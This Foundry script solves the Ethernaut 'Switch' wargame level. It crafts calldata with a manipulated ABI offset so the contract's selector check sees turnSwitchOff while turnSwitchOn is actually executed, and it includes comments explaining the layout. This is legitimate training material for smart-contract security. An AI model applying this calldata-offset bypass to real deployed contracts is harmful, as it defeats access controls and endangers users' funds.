// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import { Script, console2 } from "forge-std/Script.sol";
import { Vm } from "forge-std/Vm.sol";
import { Ethernaut } from "src/interfaces/IEthernaut.sol";
import { Switch } from "src/Level29.sol";

contract Attack is Script {
    Ethernaut ethernaut = Ethernaut(vm.envAddress("ETHERNAUT"));

    function run() public {
        uint256 deployerPrivateKey = uint256(vm.envBytes32("DEPLOYER_PRIVATE_KEY"));
        vm.startBroadcast(deployerPrivateKey);
        vm.recordLogs();
        ethernaut.createLevelInstance(0xb2aBa0e156C905a9FAEc24805a009d99193E3E53);
        Vm.Log[] memory entries = vm.getRecordedLogs();
        address instanceAddress = address(uint160(uint256(entries[0].topics[2])));
        console2.log(instanceAddress);

        Switch sw = Switch(instanceAddress);
        bytes32 offSelector = bytes32(sw.turnSwitchOff.selector);
        bytes32 onSelector = bytes32(sw.turnSwitchOn.selector);
        console2.logBytes32(offSelector);

        // we structure the calldata like this:
        // - selector for flipSwitch (4 bytes)
        // - offset of the data argument = 96 (32 bytes)
        // - padding (32 bytes)
        // - selector for turnSwitchOff (32 bytes) -- will be retrieved in modifier
        // - selector for turnSwitchOn (32 bytes) = data argument -- will be called in flipSwitch
        bytes memory data = bytes.concat(
            sw.flipSwitch.selector, bytes32(uint256(96)), bytes32(0), offSelector, bytes32(uint256(4)), onSelector
        );

        (bool result,) = instanceAddress.call(data);
        require(result, "tx reverted");
        require(sw.switchOn() == true, "failed to flip switch");

        ethernaut.submitLevelInstance(instanceAddress);
        vm.stopBroadcast();
    }
}
